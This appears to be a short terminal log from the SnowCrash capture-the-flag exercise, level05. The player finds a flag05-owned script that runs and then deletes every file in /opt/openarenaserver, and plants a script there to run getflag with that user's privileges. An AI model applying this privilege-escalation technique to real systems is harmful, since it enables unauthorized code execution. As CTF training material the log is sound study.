level05@SnowCrash:/rofs/usr/sbin$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
level05@SnowCrash:/rofs/usr/sbin$ cat /usr/sbin/openarenaserver

#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done


level05@SnowCrash:/rofs/usr/sbin$ echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
level05@SnowCrash:/rofs/usr/sbin$ chmod +x /opt/openarenaserver/script.sh
level05@SnowCrash:/rofs/usr/sbin$ ls /opt/openarenaserver/script.sh
/opt/openarenaserver/script.sh
